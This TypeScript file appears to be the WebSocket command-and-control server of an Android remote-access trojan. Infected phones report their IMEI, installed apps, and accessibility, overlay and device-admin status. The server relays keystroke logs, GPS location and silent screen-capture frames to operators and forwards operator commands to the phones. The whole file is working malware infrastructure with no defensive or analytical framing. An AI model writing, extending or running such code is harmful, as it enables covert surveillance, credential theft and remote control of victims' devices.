import { WebSocketServer, WebSocket } from 'ws';
import { IncomingMessage } from 'http';
import { randomUUID } from 'crypto';
import type { DeviceState, OperatorState, WsTextMessage } from './types.js';

const devices  = new Map<string, DeviceState>();
const operators = new Map<string, OperatorState>();

/* ── Public accessors ───────────────────────────────────────── */
export function getDevices(): DeviceState[] {
  return [...devices.values()];
}

export function getDevice(id: string): DeviceState | undefined {
  return devices.get(id);
}

/* ── Attach to WS servers ───────────────────────────────────── */
export function attachWss(
  deviceWss: WebSocketServer,
  operatorWss: WebSocketServer
): void {
  deviceWss.on('connection',  handleDeviceConnection);
  operatorWss.on('connection', handleOperatorConnection);

  // Server-side ping to detect dead device connections every 25s
  // (browsers/devices typically have a 30-60s idle TCP timeout)
  setInterval(() => {
    const now = Date.now();
    for (const [id, dev] of devices) {
      if (dev.status === 'offline') continue;

      if (dev.ws.readyState !== WebSocket.OPEN) {
        markOffline(id);
        continue;
      }

      // If lastSeen is stale by more than 60s, consider dead
      if (now - dev.lastSeen > 60_000) {
        try { dev.ws.ping(); } catch { markOffline(id); }
      }
    }
  }, 25_000);
}

/* ── Device connection ──────────────────────────────────────── */
function handleDeviceConnection(ws: WebSocket, req: IncomingMessage): void {
  const ip =
    (req.headers['x-forwarded-for'] as string | undefined)
      ?.split(',')[0]?.trim()
    ?? req.socket.remoteAddress
    ?? '0.0.0.0';

  let deviceId: string | null = null;

  ws.on('message', (rawData: Buffer | string | Buffer[], isBinary: boolean) => {
    // Binary frame = JPEG screen capture — relay immediately
    if (isBinary) {
      if (deviceId) {
        // Normalise Buffer[] (fragmented WS message) to single Buffer
        const frame = Array.isArray(rawData)
          ? Buffer.concat(rawData)
          : Buffer.isBuffer(rawData) ? rawData : Buffer.from(rawData as ArrayBuffer);
        relayFrameToOperator(deviceId, frame);
      }
      return;
    }
    const data = rawData as Buffer | string;

    let msg: WsTextMessage;
    try {
      msg = JSON.parse(data.toString()) as WsTextMessage;
    } catch {
      return;
    }

    switch (msg['type'] as string) {
      /* ── Initial registration ─────────────────────────────── */
      case 'register': {
        deviceId = String(msg['deviceId'] ?? randomUUID());

        // If reconnecting, preserve connectedAt
        const existing = devices.get(deviceId);
        const connectedAt = existing?.connectedAt ?? Date.now();

        const state: DeviceState = {
          id:                  deviceId,
          ws,
          deviceId,
          model:               String(msg['model']        ?? 'Unknown'),
          brand:               String(msg['brand']        ?? 'Unknown'),
          androidVersion:      String(msg['androidVersion'] ?? '0'),
          sdkVersion:          Number(msg['sdkVersion']   ?? 0),
          batteryLevel:        Number(msg['batteryLevel'] ?? 0),
          isCharging:          Boolean(msg['isCharging']),
          networkType:         String(msg['networkType']  ?? 'WIFI'),
          ipAddress:           ip,
          country:             String(msg['country']      ?? ''),
          operator:            String(msg['operator']     ?? ''),
          imei:                String(msg['imei']         ?? ''),
          resolution:          String(msg['resolution']   ?? ''),
          hasAccessibility:    Boolean(msg['hasAccessibility']),
          hasOverlay:          Boolean(msg['hasOverlay']),
          hasAdmin:            Boolean(msg['hasAdmin']),
          hasBatteryExemption: Boolean(msg['hasBatteryExemption']),
          installedApps:       Array.isArray(msg['installedApps'])
                                 ? (msg['installedApps'] as string[])
                                 : [],
          connectedAt,
          lastSeen:            Date.now(),
          status:              'online',
          tags:                existing?.tags ?? [],
          stealthLevel:        Number(msg['stealthLevel'] ?? 0),
          vncActive:           false,
          silentVncActive:     false,
        };
        devices.set(deviceId, state);
        broadcastToOperators({ type: 'device_update', device: publicDevice(state) });
        // Acknowledge registration
        ws.send(JSON.stringify({ type: 'register_ack', deviceId }));
        break;
      }

      /* ── Periodic device state update ────────────────────── */
      case 'update': {
        if (!deviceId) break;
        const dev = devices.get(deviceId);
        if (!dev) break;

        // Mutate only known typed fields — never spread WsTextMessage
        if (msg['batteryLevel']        !== undefined) dev.batteryLevel        = Number(msg['batteryLevel']);
        if (msg['isCharging']          !== undefined) dev.isCharging          = Boolean(msg['isCharging']);
        if (msg['networkType']         !== undefined) dev.networkType         = String(msg['networkType']);
        if (msg['hasAccessibility']    !== undefined) dev.hasAccessibility    = Boolean(msg['hasAccessibility']);
        if (msg['hasOverlay']          !== undefined) dev.hasOverlay          = Boolean(msg['hasOverlay']);
        if (msg['hasAdmin']            !== undefined) dev.hasAdmin            = Boolean(msg['hasAdmin']);
        if (msg['hasBatteryExemption'] !== undefined) dev.hasBatteryExemption = Boolean(msg['hasBatteryExemption']);
        if (msg['stealthLevel']        !== undefined) dev.stealthLevel        = Number(msg['stealthLevel']);
        if (msg['vncActive']           !== undefined) dev.vncActive           = Boolean(msg['vncActive']);
        if (msg['silentVncActive']     !== undefined) dev.silentVncActive     = Boolean(msg['silentVncActive']);
        if (msg['ipAddress']           !== undefined) dev.ipAddress           = String(msg['ipAddress']);
        if (msg['operator']            !== undefined) dev.operator            = String(msg['operator']);

        dev.lastSeen = Date.now();
        dev.status   = 'online';

        broadcastToOperators({ type: 'device_update', device: publicDevice(dev) });
        break;
      }

      /* ── Keylog event ────────────────────────────────────── */
      case 'keylog': {
        if (!deviceId) break;
        broadcastToOperators({
          type:  'keylog',
          entry: {
            timestamp: Date.now(),
            deviceId,
            app:  String(msg['app']     ?? ''),
            text: String(msg['text']    ?? ''),
            type: String(msg['logType'] ?? 'keyboard'),
          },
        });
        break;
      }

      /* ── Location ────────────────────────────────────────── */
      case 'location': {
        if (!deviceId) break;
        // Relay to subscribed operator only (sensitive)
        broadcastToSubscribers(deviceId, {
          type:     'location',
          deviceId,           // frontend needs this to attribute to the right device
          lat:      msg['lat'],
          lon:      msg['lon'],
          acc:      msg['acc'],
          speed:    msg['speed'],
          bearing:  msg['bearing'],
          ts:       Date.now(),
        });
        break;
      }

      /* ── VNC state change ────────────────────────────────── */
      case 'vnc_state': {
        if (!deviceId) break;
        const dev = devices.get(deviceId);
        if (!dev) break;
        dev.vncActive       = Boolean(msg['vncActive']);
        dev.silentVncActive = Boolean(msg['silentVncActive']);
        dev.lastSeen        = Date.now();
        broadcastToOperators({ type: 'device_update', device: publicDevice(dev) });
        break;
      }

      /* ── Pong (response to server ping) ─────────────────── */
      case 'pong': {
        if (deviceId) {
          const dev = devices.get(deviceId);
          if (dev) dev.lastSeen = Date.now();
        }
        break;
      }

      /* ── Anything else → route to subscribed operator ─────── */
      default:
        // Inject source deviceId so the frontend can route data to the right device
        if (deviceId) broadcastToSubscribers(deviceId, { ...msg, deviceId });
        break;
    }
  });

  ws.on('pong', () => {
    if (deviceId) {
      const dev = devices.get(deviceId);
      if (dev) dev.lastSeen = Date.now();
    }
  });

  ws.on('close', () => {
    if (deviceId) markOffline(deviceId);
  });

  ws.on('error', () => {
    if (deviceId) markOffline(deviceId);
  });
}

/* ── Operator connection ────────────────────────────────────── */
function handleOperatorConnection(ws: WebSocket): void {
  const operatorId = randomUUID();
  const state: OperatorState = {
    id:                 operatorId,
    ws,
    subscribedDeviceId: null,
    connectedAt:        Date.now(),
  };
  operators.set(operatorId, state);

  // Send current device list on connect
  ws.send(JSON.stringify({
    type:    'device_list',
    devices: [...devices.values()].map(publicDevice),
  }));

  ws.on('message', (data: Buffer | string) => {
    let msg: WsTextMessage;
    try {
      msg = JSON.parse(data.toString()) as WsTextMessage;
    } catch {
      return;
    }

    switch (msg['type'] as string) {
      case 'subscribe': {
        state.subscribedDeviceId = String(msg['deviceId'] ?? '');
        // Immediately send device info to freshly subscribed operator
        const dev = devices.get(state.subscribedDeviceId);
        if (dev) ws.send(JSON.stringify({ type: 'device_update', device: publicDevice(dev) }));
        break;
      }

      case 'unsubscribe': {
        state.subscribedDeviceId = null;
        break;
      }

      case 'command': {
        const targetId = String(msg['deviceId'] ?? '');
        const dev = devices.get(targetId);
        if (dev?.ws.readyState === WebSocket.OPEN) {
          dev.ws.send(JSON.stringify({
            type:    'command',
            command: String(msg['command'] ?? ''),
            params:  (msg['params'] as Record<string, unknown>) ?? {},
          }));
        } else {
          ws.send(JSON.stringify({ type: 'error', message: 'Device not connected', deviceId: targetId }));
        }
        break;
      }

      case 'ping': {
        ws.send(JSON.stringify({ type: 'pong' }));
        break;
      }

      default:
        break;
    }
  });

  ws.on('close', () => {
    operators.delete(operatorId);
  });

  // Required — operator WS errors must not crash the server
  ws.on('error', (err) => {
    console.error(`[ws/operator] error ${operatorId}:`, err.message);
    operators.delete(operatorId);
  });
}

/* ── Helpers ────────────────────────────────────────────────── */

function markOffline(deviceId: string): void {
  const dev = devices.get(deviceId);
  if (!dev || dev.status === 'offline') return;
  dev.status = 'offline';
  broadcastToOperators({ type: 'device_update', device: publicDevice(dev) });

  // Reap after 60 min if still offline
  setTimeout(() => {
    const current = devices.get(deviceId);
    if (current?.status === 'offline') {
      devices.delete(deviceId);
      broadcastToOperators({ type: 'device_disconnected', deviceId });
    }
  }, 60 * 60_000);
}

const MAX_OP_BUFFER_BYTES = 256 * 1024; // 256 KB — drop frame if operator is lagging

function relayFrameToOperator(deviceId: string, frame: Buffer): void {
  for (const op of operators.values()) {
    if (op.subscribedDeviceId !== deviceId || op.ws.readyState !== WebSocket.OPEN) continue;
    // Backpressure: skip frame if operator send buffer is backed up
    const buffered = (op.ws as unknown as { bufferedBytes?: number }).bufferedBytes ?? 0;
    if (buffered > MAX_OP_BUFFER_BYTES) continue;
    try {
      op.ws.send(frame, { binary: true });
    } catch {
      // Socket in bad state — will trigger close/error handler
    }
  }
}

function broadcastToOperators(msg: unknown): void {
  const raw = JSON.stringify(msg);
  for (const op of operators.values()) {
    if (op.ws.readyState === WebSocket.OPEN) op.ws.send(raw);
  }
}

function broadcastToSubscribers(deviceId: string, msg: unknown): void {
  const raw = JSON.stringify(msg);
  for (const op of operators.values()) {
    if (
      op.subscribedDeviceId === deviceId &&
      op.ws.readyState === WebSocket.OPEN
    ) {
      op.ws.send(raw);
    }
  }
}

function publicDevice(dev: DeviceState): Omit<DeviceState, 'ws'> {
  // eslint-disable-next-line @typescript-eslint/no-unused-vars
  const { ws: _ws, ...rest } = dev;
  return rest;
}
